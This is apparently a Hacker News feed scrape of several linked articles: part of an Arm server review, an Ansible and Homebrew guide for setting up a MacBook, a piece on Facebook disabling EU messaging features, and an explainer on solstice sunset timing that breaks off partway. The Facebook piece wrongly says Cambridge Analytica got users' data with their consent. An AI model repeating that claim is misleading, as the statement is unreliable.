<figure id="attachment_49479" aria-describedby="caption-attachment-49479"><a href="https://www.servethehome.com/ampere-altra-wiwynn-mt-jade-server-review-the-most-significant-arm-server/wiwynn-mt-jade-ampere-altra-backplane/" rel="attachment wp-att-49479"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/12/Wiwynn-Mt-Jade-Ampere-Altra-Backplane.jpg" alt="Wiwynn Mt Jade Ampere Altra Backplane" width="800" height="534" srcset="https://www.servethehome.com/wp-content/uploads/2020/12/Wiwynn-Mt-Jade-Ampere-Altra-Backplane.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/12/Wiwynn-Mt-Jade-Ampere-Altra-Backplane-400x267.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/12/Wiwynn-Mt-Jade-Ampere-Altra-Backplane-696x465.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/12/Wiwynn-Mt-Jade-Ampere-Altra-Backplane-629x420.jpg 629w" sizes="(max-width: 800px) 100vw, 800px"></a><figcaption id="caption-attachment-49479">Wiwynn Mt Jade Ampere Altra Backplane</figcaption></figure>
<p>The chassis itself has four of those drive bays (one cable’s worth) that are optionally connected. Although the cable is connected via the backplane here, the other end can be used in a PCIe Gen4 x16 header that can instead provide PCIe connectivity to rear risers. Ampere Altra has many PCIe lanes, but there are limits. Still, Wiwynn’s forward-looking design is moving beyond the limitations of PCB and has configurability on where PCIe lanes are directed. We will see more of this type of design in the PCIe Gen4 era but it will become increasingly commonplace as we move to PCIe Gen5 and beyond. Effectively, with Ampere Altra is providing Wiwynn with a platform that is already incorporating these design principles.</p>
<p>On the rear of the server, we see a fairly standard layout. The rear I/O consists of a VGA port, a management LAN port, a serial port, and two USB 3 ports. There are three blocks for I/O risers, two are full-height and one is low-profile. One can also see an OCP NIC 3.0 slot in the middle of the platform.</p>
<figure id="attachment_49490" aria-describedby="caption-attachment-49490"><a href="https://www.servethehome.com/ampere-altra-wiwynn-mt-jade-server-review-the-most-significant-arm-server/wiwynn-mt-jade-ampere-altra-rear/" rel="attachment wp-att-49490"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/12/Wiwynn-Mt-Jade-Ampere-Altra-Rear.jpg" alt="Wiwynn Mt Jade Ampere Altra Rear" width="800" height="479" srcset="https://www.servethehome.com/wp-content/uploads/2020/12/Wiwynn-Mt-Jade-Ampere-Altra-Rear.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/12/Wiwynn-Mt-Jade-Ampere-Altra-Rear-400x240.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/12/Wiwynn-Mt-Jade-Ampere-Altra-Rear-696x417.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/12/Wiwynn-Mt-Jade-Ampere-Altra-Rear-701x420.jpg 701w" sizes="(max-width: 800px) 100vw, 800px"></a><figcaption id="caption-attachment-49490">Wiwynn Mt Jade Ampere Altra Rear</figcaption></figure>
<p>The 2kW power supplies seem a bit large for the relatively lower power consumption of the Ampere Arm server chips. The 80Plus Platinum units are likely larger than a normal server of this class simply as this is also a development platform. As a result, people tend to plug a multitude of devices into this type of server. That can include many high-power NVMe SSDs up front, or even accelerators in the rear. We tried the <a href="https://www.servethehome.com/nvidia-tesla-t4-ai-inferencing-gpu-review/">NVIDIA T4</a> and it worked in this platform.</p>
<figure id="attachment_49489" aria-describedby="caption-attachment-49489"><a href="https://www.servethehome.com/ampere-altra-wiwynn-mt-jade-server-review-the-most-significant-arm-server/wiwynn-mt-jade-ampere-altra-psu/" rel="attachment wp-att-49489"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/12/Wiwynn-Mt-Jade-Ampere-Altra-PSU.jpg" alt="Wiwynn Mt Jade Ampere Altra PSU" width="800" height="534" srcset="https://www.servethehome.com/wp-content/uploads/2020/12/Wiwynn-Mt-Jade-Ampere-Altra-PSU.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/12/Wiwynn-Mt-Jade-Ampere-Altra-PSU-400x267.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/12/Wiwynn-Mt-Jade-Ampere-Altra-PSU-696x465.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/12/Wiwynn-Mt-Jade-Ampere-Altra-PSU-629x420.jpg 629w" sizes="(max-width: 800px) 100vw, 800px"></a><figcaption id="caption-attachment-49489">Wiwynn Mt Jade Ampere Altra PSU</figcaption></figure>
<p>Part of the purpose of this piece is to show how similar the server is to a modern x86 server since that is a big question when organizations are looking to add Arm into their data centers.</p>
<p>Next, we are going to look at the internals of the server before proceeding with the remainder of our review.</p>
        </div></div>]]>
            </description>
            <link>https://www.servethehome.com/ampere-altra-wiwynn-mt-jade-server-review-the-most-significant-arm-server/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25503939</guid>
            <pubDate>Tue, 22 Dec 2020 07:42:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Team Building for early-stage startups]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25503916">thread link</a>) | @madmax108
<br/>
December 21, 2020 | https://www.notion.so/Team-Building-for-early-stage-startups-bcf644db356b4ca58108909448ec2ab0 | <a href="https://web.archive.org/web/*/https://www.notion.so/Team-Building-for-early-stage-startups-bcf644db356b4ca58108909448ec2ab0">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.notion.so/Team-Building-for-early-stage-startups-bcf644db356b4ca58108909448ec2ab0</link>
            <guid isPermaLink="false">hacker-news-small-sites-25503916</guid>
            <pubDate>Tue, 22 Dec 2020 07:37:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Automatically Setup Your MacBook for Development]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25503906">thread link</a>) | @dsteenman
<br/>
December 21, 2020 | https://dannys.cloud/automatically-setup-macbook-development | <a href="https://web.archive.org/web/*/https://dannys.cloud/automatically-setup-macbook-development">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><p>As a Cloud Engineer, automation has become a part of my daily life. Automatically deploying Infrastructure using Code has become a safe and fast way to provision servers in the Cloud. Initially, it takes more time to configure the infrastructure as code, but it's reusable and minimizes configuration errors by human mistakes.</p>
<p><strong>What if we could apply the same principle to our local development environment?</strong> This guide will show you how to automatically set up your Macbook or Linux machine using Ansible and dotfiles.</p>
<p><strong>Table of Contents</strong></p>
<ul>
<li><a href="#prerequisite">Prerequisite</a></li>
<li><a href="#homebrew">Homebrew</a></li>
<li><a href="#ansible">Ansible</a></li>
<li><a href="#playbook">Playbook</a></li>
<li><a href="#setup-your-preferred-packages">Setup your preferred packages</a></li>
<li><a href="#configure-dotfiles">Configure dotfiles</a></li>
<li><a href="#installation">Installation</a></li>
<li><a href="#installation-complete">Installation complete!</a></li>
</ul>
<h2 id="prerequisite">Prerequisite</h2>
<p>Ensure Apple's command-line tools are installed:</p>
<pre><code>xcode-select --install
</code></pre>
<h2 id="homebrew">Homebrew</h2>
<p>The first step is to download  <a target="_blank" href="https://brew.sh/">Homebrew</a>  for your Mac:</p>
<pre><code>/bin/bash -c <span>"<span>$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)</span>"</span>
</code></pre>
<p>Homebrew allows you to easily install packages and applications on your machine without having to go to the download page of the vendor to install it from there. An added benefit is that you can easily update the packages using a simple command like:</p>
<pre><code>brew update &amp;&amp; brew upgrade
</code></pre>
<h2 id="ansible">Ansible</h2>
<p> <a target="_blank" href="https://www.ansible.com/overview/how-ansible-works">Ansible</a>  is a tool that automates provisioning, does configuration management, and is being used widely in the Cloud.</p>
<p>It uses no agents and no additional custom security infrastructure, so it's easy to deploy - and most importantly, it uses a very simple language (YAML, in the form of Ansible Playbooks) that allow you to describe your automation jobs in a way that approaches plain English.</p>
<p>So the next step is to install  <a target="_blank" href="https://www.ansible.com/">Ansible</a> using Homebrew:</p>
<pre><code>brew install python ansible
</code></pre>
<p>An important note when installing Python with Homebrew is that we need to change the PATH on our system for Python, otherwise MacOS will use the system default Python.</p>
<pre><code><span>export</span> PATH=<span>"/usr/local/opt/python/libexec/bin:<span>$PATH</span>"</span>
</code></pre>
<p>We want to avoid using the system default for  <a target="_blank" href="https://towardsdatascience.com/time-to-make-the-switch-9eb719d434de">many reasons</a>, but the most important one is that it still comes with Python2.7 (which is deprecated).</p>
<h2 id="playbook">Playbook</h2>
<p>Ansible is the orchestration tool and uses <a target="_blank" href="https://docs.ansible.com/ansible/latest/user_guide/playbooks.html">Playbooks</a> to record and execute Ansible’s configuration and deployment on the system.</p>
<p>Playbooks can be seen as an instruction manual at which the system is guided to execute the instructions that you have written. The benefit of using this is that you can apply the same set of instructions to different machines and expect the same outcome every time.</p>
<p>These Playbooks can be shared. So before we proceed with the installation, you need to clone or fork the <a target="_blank" href="https://github.com/geerlingguy/mac-dev-playbook">mac-dev-playbook repository</a>.</p>
<h2 id="setup-your-preferred-packages">Setup your preferred packages</h2>
<p>Every development environment is unique, so you can create a <code>config.yml</code> that contains a list of packages and configuration settings that you want to apply to your environment. As an example you can have a look at the <code>default.config.yml</code> in the root of the folder which contains a list of packages and configurations, as shown below:</p>
<pre><code><span>---</span>
<span>downloads:</span> <span>~/.ansible-downloads/</span>

<span>configure_dotfiles:</span> <span>true</span>
<span>configure_terminal:</span> <span>true</span>
<span>configure_osx:</span> <span>true</span>

<span>configure_sudoers:</span> <span>false</span>
<span>sudoers_custom_config:</span> <span>''</span>





<span>dotfiles_repo:</span> <span>https://github.com/geerlingguy/dotfiles.git</span>
<span>dotfiles_repo_accept_hostkey:</span> <span>true</span>
<span>dotfiles_repo_local_destination:</span> <span>~/Development/GitHub/dotfiles</span>
<span>dotfiles_files:</span>
  <span>-</span> <span>.zshrc</span>
  <span>-</span> <span>.gitignore</span>
  <span>-</span> <span>.inputrc</span>
  <span>-</span> <span>.osx</span>
  <span>-</span> <span>.vimrc</span>

<span>homebrew_installed_packages:</span>
  
  <span>-</span> <span>autoconf</span>
  <span>-</span> <span>bash-completion</span>
  <span>-</span> <span>doxygen</span>
  <span>-</span> <span>gettext</span>
  <span>-</span> <span>gifsicle</span>
  <span>-</span> <span>git</span>
  <span>-</span> <span>github/gh/gh</span>
  <span>-</span> <span>go</span>
  <span>-</span> <span>gpg</span>
  <span>-</span> <span>httpie</span>
  <span>-</span> <span>iperf</span>
  <span>-</span> <span>libevent</span>
  <span>-</span> <span>sqlite</span>
  <span>-</span> <span>mcrypt</span>
  <span>-</span> <span>nmap</span>
  <span>-</span> <span>node</span>
  <span>-</span> <span>nvm</span>
  <span>-</span> <span>php</span>
  <span>-</span> <span>ssh-copy-id</span>
  <span>-</span> <span>cowsay</span>
  <span>-</span> <span>readline</span>
  <span>-</span> <span>openssl</span>
  <span>-</span> <span>pv</span>
  <span>-</span> <span>wget</span>
  <span>-</span> <span>wrk</span>

<span>homebrew_taps:</span>
  <span>-</span> <span>homebrew/core</span>
  <span>-</span> <span>homebrew/cask</span>

<span>homebrew_cask_appdir:</span> <span>/Applications</span>
<span>homebrew_cask_apps:</span>
  <span>-</span> <span>chromedriver</span>
  <span>-</span> <span>docker</span>
  <span>-</span> <span>dropbox</span>
  <span>-</span> <span>firefox</span>
  <span>-</span> <span>google-chrome</span>
  <span>-</span> <span>handbrake</span>
  <span>-</span> <span>licecap</span>
  <span>-</span> <span>sequel-pro</span>
  <span>-</span> <span>slack</span>
  <span>-</span> <span>sublime-text</span>
  <span>-</span> <span>transmit</span>
  <span>-</span> <span>vagrant</span>


<span>mas_installed_apps:</span> []
<span>mas_email:</span> <span>""</span>
<span>mas_password:</span> <span>""</span>

<span>osx_script:</span> <span>"~/.osx --no-restart"</span>




<span>composer_packages:</span> []



<span>gem_packages:</span> []



<span>npm_packages:</span> []



<span>pip_packages:</span> []





<span>post_provision_tasks:</span> []
</code></pre>
<p>This playbook is pretty versatile and allows you to install Homebrew, Mac Application Store (mas) packages, composer, gem, npm, and pip packages.</p>
<h2 id="configure-dotfiles">Configure dotfiles</h2>
<p>Once you've created your own config file with your preferred packages, it's time to add your own Dotfiles repository to setup custom configurations for your software.</p>
<p><strong>So what are dotfiles?</strong> Dotfiles are text-based configuration files that store settings of almost every application, or tool that runs in your environment. In communities like Github, people share their application preferences so others can use them to set up their systems faster by restoring these "dotfile" configuration files. The biggest advantage is that you can backup your application preferences and make sure you're always using the same preferences, irrespective of the machine that you're using.</p>
<p>If you're new to dotfiles you can read more about it in this <a target="_blank" href="https://dotfiles.github.io/">helpful guide on dotfiles</a>. I'll also share a few links below which contain pre-configured dotfiles for your favorite tools:</p>
<ul>
<li><a target="_blank" href="https://github.com/mathiasbynens/dotfiles">Mathias’s dotfiles</a></li>
<li><a target="_blank" href="https://github.com/Bash-it/bash-it">Community bash framework</a></li>
<li><a target="_blank" href="https://github.com/alrra/dotfiles">Allra macOS / Ubuntu dotfiles</a></li>
<li><a target="_blank" href="https://github.com/geerlingguy/dotfiles">Geerlingguy's dotfiles</a></li>
</ul>
<p><strong>Note: dotfiles contain personal preferences, so it's good to review these files and apply changes where necessary before you copy them to your own repository</strong></p>
<p>Once you have your own repository filled with dotfiles, you can update the <code>dotfiles_repo</code> variable in the <code>config.yml</code> with your own dotfiles repository. Below I've shown an example of what it looks like when I set up my own dotfiles:</p>
<pre><code><span>configure_dotfiles:</span> <span>true</span>
<span>dotfiles_repo_accept_hostkey:</span> <span>false</span>
<span>dotfiles_repo_local_destination:</span> <span>~/Github/dotfiles</span>
<span>dotfiles_repo_version:</span> <span>master</span>
<span>dotfiles_repo:</span> <span>git@github.com:dsteenman/dotfiles.git</span>
<span>dotfiles_files:</span>
  <span>-</span> <span>.aliases.zsh</span>
  <span>-</span> <span>.aws</span>
  <span>-</span> <span>.eslintignore</span>
  <span>-</span> <span>.eslintrc</span>
  <span>-</span> <span>.fzf.zsh</span>
  <span>-</span> <span>.gitconfig</span>
  <span>-</span> <span>.gitconfig.user</span>
  <span>-</span> <span>.gitignore</span>
  <span>-</span> <span>.iterm2</span>
  <span>-</span> <span>.macos</span>
  <span>-</span> <span>.starship</span>
  <span>-</span> <span>.zprofile</span>
  <span>-</span> <span>.zsh_plugins.txt</span>
  <span>-</span> <span>.zshenv</span>
  <span>-</span> <span>.zshrc</span>
</code></pre>
<p>The parameter <code>dotfiles_repo_local_destination</code> is the location where ansible downloads your dotfiles repository. Remember that location, because that's where you'll manage changes in your dotfiles. Ansible automatically creates symlinks of the dotfiles that you enabled in the parameter <code>dotfiles_files</code> and link them to your home folder on your Mac or Ubuntu machine. The advantage of this construction is that when you make adjustments in your dotfiles over time, it will automatically update the repository. You only have to commit and push the changes to update it remotely.</p>
<h2 id="installation">Installation</h2>
<p>Once the requirements have been fulfilled, we can proceed with the actual installation and let Ansible perform it's magic!</p>
<p>In the root of the folder <code>mac-dev-playbook</code> repository that you forked or cloned run the command <code>ansible-galaxy install -r requirements.yml</code> to install the required ansible roles.</p>
<p>Now you can run the playbook and install your packages and dotfiles with the command <code>ansible-playbook main.yml -u [username] --ask-become-pass</code> (substitute <code>[username]</code> for your username). Enter your account password when prompted.</p>
<h2 id="installation-complete">Installation complete!</h2>
<p><strong>Your Macbook should be fully customized and ready for development!</strong> Having automated provisioning of your development machine is very useful if you use lots of different development tools, each with its own unique settings.</p>
<p>If you need to manage these tools then it's a must to keep track of any changes in preferences. By using this playbook solution we save our configurations in Github. That way we have a backup and we're able to reuse these settings irrespective of any machine we use.</p>
<p>Once you've setup your playbook, it takes approximately 30 minutes to install all the development packages and preferred configuration settings.</p>
<hr>
<p>👋 <strong>Liked this article?</strong> Follow me on <a target="_blank" href="https://twitter.com/dannysteenman">Twitter</a> to stay updated!</p>
</div></div>]]>
            </description>
            <link>https://dannys.cloud/automatically-setup-macbook-development</link>
            <guid isPermaLink="false">hacker-news-small-sites-25503906</guid>
            <pubDate>Tue, 22 Dec 2020 07:35:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Facebook hit with privacy issues in Europe]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25503513">thread link</a>) | @attainalexander
<br/>
December 21, 2020 | https://www.mytechgist.com/big-tech/facebook-hit-with-privacy-issues-in-europe/ | <a href="https://web.archive.org/web/*/https://www.mytechgist.com/big-tech/facebook-hit-with-privacy-issues-in-europe/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-td-block-uid="tdi_87_85e">

<div>




<p>Facebook is racing to catch up with privacy laws once again. Facebook privacy issues are nothing new, now the social media giant has temporarily disabled a number of Instagram and Messenger features. This is in order to comply with new directives set to go in place later this month. Facebook is taking steps to make sure the services comply with a change in privacy rules, as messaging apps will fulfill under <a href="https://www.mytechgist.com/big-tech/the-eu-is-about-to-announce-new-rules-for-big-tech/">EU regulations</a> – the ePrivacy directive – from Monday.</p>







<figure><img width="1024" height="683" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201024%20683'%3E%3C/svg%3E" alt="" data-lazy-srcset="https://www.mytechgist.com/wp-content/uploads/2020/12/pexels-tracy-le-blanc-607812-1024x683.jpg 1024w, https://www.mytechgist.com/wp-content/uploads/2020/12/pexels-tracy-le-blanc-607812-300x200.jpg 300w, https://www.mytechgist.com/wp-content/uploads/2020/12/pexels-tracy-le-blanc-607812-768x512.jpg 768w, https://www.mytechgist.com/wp-content/uploads/2020/12/pexels-tracy-le-blanc-607812-1536x1024.jpg 1536w, https://www.mytechgist.com/wp-content/uploads/2020/12/pexels-tracy-le-blanc-607812-2048x1365.jpg 2048w, https://www.mytechgist.com/wp-content/uploads/2020/12/pexels-tracy-le-blanc-607812-696x464.jpg 696w, https://www.mytechgist.com/wp-content/uploads/2020/12/pexels-tracy-le-blanc-607812-1068x712.jpg 1068w, https://www.mytechgist.com/wp-content/uploads/2020/12/pexels-tracy-le-blanc-607812-1920x1280.jpg 1920w, https://www.mytechgist.com/wp-content/uploads/2020/12/pexels-tracy-le-blanc-607812-630x420.jpg 630w" data-lazy-sizes="(max-width: 1024px) 100vw, 1024px" data-lazy-src="https://www.mytechgist.com/wp-content/uploads/2020/12/pexels-tracy-le-blanc-607812-1024x683.jpg"><figcaption>Photo by&nbsp;<strong><a href="https://www.pexels.com/@tracy-le-blanc-67789?utm_content=attributionCopyText&amp;utm_medium=referral&amp;utm_source=pexels">Tracy Le Blanc</a></strong>&nbsp;from&nbsp;<strong><a href="https://www.pexels.com/photo/apple-applications-apps-cell-phone-607812/?utm_content=attributionCopyText&amp;utm_medium=referral&amp;utm_source=pexels">Pexels</a></strong></figcaption></figure>



<p>There is no specific list of disabled features but here is a short list of the features disabled in the past few days:</p>



<ul><li>Media file sends in Messenger</li><li>Chat nicknames in Messenger</li><li>Polls on Messenger</li><li>Personalized replies in Messenger</li><li>Stickers in Instagram DMs</li><li>Polls in Instagram DMs</li><li>AR effects in Instagram DMs</li></ul>



<h2 id="h-will-these-features-be-back">Will these features be back?</h2>



<p>There is currently no concrete timeline for when these features will return to European users. But Facebook is insistent that the changes are temporary, and should be “coming back very soon.”</p>



<p>Facebook has stated that its reason for disabling these features is for compliance with the <a href="https://eur-lex.europa.eu/LexUriServ/LexUriServ.do?uri=CONSLEG:2002L0058:20091219:EN:HTML" target="_blank" rel="noreferrer noopener">2002 ePrivacy directive</a> from the European Union. This directive goes into effect on December 21st and outlines a number of strict rules for messaging platforms, like Messenger and Instagram.</p>



<p>More specifically, the ePrivacy directive is concerned with “the processing of personal data and the protection of privacy”. Simply put, it’s designed to keep tech companies in check when it comes to how they use the information in your messages and the metadata that comes with them. In a statement, Facebook said: “We’re still determining the best way to bring these features back”. It takes time to rebuild products in a way that works seamlessly for people and also comply with the new regulation.”</p>



<p>In another statement, Facebook said: “We’re still determining the best way to bring these features back. “It takes time to rebuild products in a way that work seamlessly for people and also comply with new regulation.”</p>



<h2 id="h-conclusion">Conclusion</h2>



<p>Facebook privacy issues are not new, we all remember the <a href="https://en.wikipedia.org/wiki/Facebook%E2%80%93Cambridge_Analytica_data_scandal" target="_blank" rel="noreferrer noopener">Cambridge Analytica</a>, incident where millions of data Facebook users’ data were acquired with the individuals’ consent. Then social media giant is taking precautionary measures to ensure that the company is safe from legal issues.</p>



<p>However, it’s very likely that Facebook is taking these extra precautions to protect itself as best it can. </p>




</div></div></div>]]>
            </description>
            <link>https://www.mytechgist.com/big-tech/facebook-hit-with-privacy-issues-in-europe/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25503513</guid>
            <pubDate>Tue, 22 Dec 2020 06:20:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why aren't the earliest sunset/latest sunrise on the day of the winter solstice?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25503062">thread link</a>) | @fortran77
<br/>
December 21, 2020 | http://larry.denenberg.com/earliest-sunset.html | <a href="https://web.archive.org/web/*/http://larry.denenberg.com/earliest-sunset.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">

<p><small>
<a href="http://www.larry.denenberg.com/">Larry's home page</a>
</small>
</p>

<h3>
Why aren't the earliest sunset and latest sunrise on the same day as
the winter solstice?
</h3>

<p>The shortest day of the year is the day of the winter solstice, which in
2020 is December 20 or 21 depending on time zone. It seems reasonable that
the latest sunrise and earliest sunset would both occur on the shortest
day.&nbsp; But it's not so; the earliest sunset is a couple of weeks
earlier and the latest sunrise is a couple of weeks later.&nbsp; <a name="back1" href="#note1">[Note&nbsp;1]</a>&nbsp; (The notes contain
additional explanation that can be skipped on first reading.)

</p><p>What explains this peculiarity?&nbsp; Why don't the earliest sunset and
latest sunrise both fall on the shortest day?

</p><p>The time of day when the sun reaches its highest point in the sky is
called <em>solar noon</em>.&nbsp; The length of time from one solar noon to
the next is called the <em>solar day</em>.&nbsp; That is, one solar day is
the time it takes for the sun to return to its highest point in the sky.

</p><p>The length of the solar day varies during the year:&nbsp; Near
the winter and summer solstices the solar day is <em>more</em> than 24
hours long, and near the spring and fall equinoxes it's <em>less</em> than
24 hours long.&nbsp; (Why so?&nbsp;We'll see shortly.)&nbsp;
<!--
So solar noon
rarely occurs exactly at clock noon; it's sometimes before and sometimes
after.&nbsp;
-->
Therefore:&nbsp; <em>near the solstices, solar noon occurs at a slightly
later clock time each day</em> because the solar day is more than 24 hours
and the clock day is always exactly 24 hours.

</p><p>Next: Since solar noon is a little later each day, sunset is also a
little later each day.&nbsp; (This is true because
the time from solar noon to sunset doesn't change very much near the
winter solstice <a name="back2" href="#note2">[Note&nbsp;2]</a>.)&nbsp;
But if sunset is a little later each day, that means
the earliest sunset has already happened!&nbsp; By the same reasoning,
later solar noons at the solstice imply later sunrises, hence sunrise is getting later
and the latest sunrise is yet to occur.&nbsp; [Notes <a name="back3" href="#note3">3</a>, <a name="back4" href="#note4">4</a>]

</p><p>So now we see why a longer-than-average solar day causes both earliest
sunset and latest sunrise to <em>not</em> fall on the solstice. The next
step is to understand why the length of the solar day varies, and in
particular why it is longer at the solstices.

</p><p>There are two factors that change the length of the solar day.&nbsp; The
first is that the earth's axis is tilted with respect to its orbit around
the sun, and the second is that the earth's orbit is not a circle but an
ellipse.&nbsp; The first of these factors, called the <em>obliquity</em> of
the axis, has the larger effect and is the only one we examine
here <a name="back5" href="#note5">[Note&nbsp;5]</a>.&nbsp; So let's study
the length of the solar day assuming that the tilted earth orbits the sun in a
perfect circle.

</p><p>Here's a summary:&nbsp; The length of the solar day is determined mostly
by the rotation of the earth on its axis, but is also affected a little bit
by the revolution of the earth around the sun.&nbsp; The rotation by itself
would create a solar day of constant length whether the axis was tilted or
not.&nbsp; The slight change caused by the revolution would be a constant if
the earth were not tilted, but because of the tilt it is <em>not</em>
constant;&nbsp; this effect varies through the year and makes the
solar day longer near the solstices and shorter near the equinoxes.&nbsp;
Now for the details.&nbsp; [The explanation that follows is based on a
presentation by Andy Latto.]

</p><p>At any instant, there is exactly one point on the earth's surface where
the sun is directly overhead.&nbsp; To find it, draw a line from the center
of the sun to the center of the earth and stand on the point where the line
touches the earth's surface.&nbsp; At that point, and no other, the sun is
exactly overhead.&nbsp; It is solar noon at that point and also everywhere
else at the same longitude.

</p><p>If the earth were motionless with respect to the sun, the
sun-directly-overhead point would always be in the same spot. But the point
moves, both because of the rotation of the earth on its axis and because of
the revolution of the earth around the sun.&nbsp; When the point moves once
around the earth, one solar day has passed.&nbsp;When we say "once
around the earth" we care only about the <em>east-west</em> motion of
the point—solar noon recurs when the point traverses 360 degrees of
longitude.&nbsp; The <em>north-south</em> motion of the point doesn't
matter to us since it doesn't count in determining whether solar noon has arrived.

</p><p>First let's examine the effect of the earth's rotation.&nbsp; Imagine an
untilted earth not revolving around the sun, just rotating, and it's
obvious that the sun-directly-overhead point moves along the equator, once
around per day.&nbsp; Now mentally tilt the earth's axis
and you'll see that the point follows
some other parallel of latitude, still once around per
day.&nbsp; <a name="back6" href="#note6">[Note 6]</a>&nbsp; Since the point
moves along a parallel of latitude, it moves in a purely east-west
direction, in fact due west.&nbsp; If we measure speed in degrees of
longitude per hour (not in miles per hour!) we realize that the speed of
the point is constant, no matter what latitude it's at; it goes once
around, 360 degrees, each day.

</p><p>The bottom line is that the rotation of the earth causes the
sun-directly-overhead point to move directly west, crossing lines of
longitude at a constant rate.&nbsp; If this were the only factor to
consider, the length of the solar day would be constant regardless of any
tilt.

</p><p>Now we have to add the effect of the earth's revolution around the
sun.&nbsp; Again, start by imagining the earth with untilted axis, this
time not rotating but just revolving around the sun.&nbsp; You'll see the
sun-directly-overhead point moving once around the earth each year.&nbsp;
And (take my word for this) the point moves eastward, so its motion is
<em>contrary</em> to the motion from the rotation—when added in, this
motion makes each solar day a little <em>longer</em> than it would be from
the rotation alone.&nbsp; (But just a very little, since the motion from
the revolution is so much slower.)&nbsp; If the earth were not tilted, the
motion due to revolution would be due east at constant rate, and would
lengthen each day equally throughout the year.

</p><p>But the earth <em>is</em> tilted!&nbsp; So the earth's revolution around
the sun doesn't move the sun-directly-overhead point along the equator, but
rather around a great circle that's tilted with respect to the
equator.&nbsp; Here's the path that the sun-directly-overhead point would
follow if only revolution around the sun was a factor (and also the
constant-latitude path that the sun-directly-overhead point would follow if
we only take into account the earth's rotation): <img src="http://larry.denenberg.com/sdo-point.jpg" alt="Path of the SDO point">

</p><p>Now the crux of the matter: As the sun-directly-overhead point moves
around this great-circle path, it is <em>not</em> moving directly
east.&nbsp; It moves generally east, but sometimes it's travelling a little
northeast and sometimes a little southeast.&nbsp; It moves due east only at
its most northerly and southerly extent, which happens at the solstices.

</p><p>So even though the overall speed of the point is constant,
the <em>eastward component</em> of the speed is not constant, and that's
what we care about:&nbsp; it's fastest when the point is moving due east
(at the solstices), and is smaller when the point is moving north or south
as well as east.&nbsp; The eastward speed is slowest when the point has the
largest northerly or southerly motion, that is, at the equinoxes, when the
point crosses the equator.&nbsp; <a name="back7" href="#note7">[Note&nbsp;7]</a>

</p><p>Hence this once-around-per-year motion of the point, which makes each
day a little longer, has a different effect at different times of the
year.&nbsp; At the solstices the motion is due east, so its eastward motion
is fastest and lengthens the solar day more.&nbsp; That is, at the
solstices, the solar day is longer than its average length.&nbsp; At the
equinoxes, the point is moving northeast or southeast as much as it ever
does, so the eastward component of its speed is at its slowest and has the
least effect at making the day longer.&nbsp; That is, at the equinoxes, the
solar day is a little shorter than average.&nbsp; And we're done.

</p><p>One last comment:&nbsp; If you take a picture of the sun each day when
your clock says noon (<em>not</em> at local solar noon) the sun is not
always in the same place in the sky.&nbsp; It moves east and west because
of the variation in the length of the solar day, and it moves north and
south with the change of the seasons.&nbsp; The combination of these
motions traces out a figure-eight shape called
the <a href="http://www.analemma.com/"><em>analemma</em></a> which you can
see pictured on some globes.

</p><h3><a name="notes">Notes:</a></h3>

<p><a name="note1">[1]</a> The actual dates of earliest sunset and latest
sunrise depend on latitude—near the equator, the earliest sunset occurs
in November!&nbsp; Solstices and equinoxes happen at the same instant
worldwide.&nbsp; <a href="#back1"><small>back</small></a>

</p><p><a name="note2"></a> 
[2] You might object to this:&nbsp; "The time
between solar noon and sunset isn't constant!" I hear you cry.&nbsp;
"It gets shorter in December and longer in July, making more or less
daylight!"&nbsp; Yes it does, but that change happens <em>very</em>
slowly near the solstices and can be ignored.

</p><p>Think of it this way:&nbsp; There are two factors that change the time
of sunset.&nbsp; The first is the change in the number of hours of
daylight—we get fewer hours of daylight as we move towards December,
which is reflected in earlier sunsets.&nbsp; The second factor is the
difference between solar time and clock time, which we're explaining in
this website (see Note&nbsp;4).&nbsp; The first factor is the dominating factor
through most of the year.&nbsp; Near the summer and winter solstices,
though, the amount of daylight in the day is essentially constant, changing
only a tiny amount from day to day, and the second factor comes into
play.&nbsp; <a href="#back2"><small>back</small></a>

</p><p><a name="note3">[3]</a> We can apply the same reasoning to the summer
solstice to conclude that the <em>latest</em> sunset must <em>follow</em>
the summer solstice, and the <em>earliest</em> sunrise
must <em>precede</em> the summer solstice.&nbsp; Just remember that
<em>at either solstice, both sunrise and sunset are getting later</em> and
you can always tell where the earliest/latest sunrise/sunset occur.
&nbsp; <a href="#back3"><small>back</small></a>

</p><p><a name="note4">[4]</a> Here's another way to look at it:&nbsp; We don't
tell time using the solar day, because we want all days to have exactly the
same length.&nbsp; So we use clocks that run at a constant rate independent
of the sun, ticking off exactly 24&nbsp;hours each day.&nbsp; These clocks
average out the variations in the solar day, making all days the same</p></div>
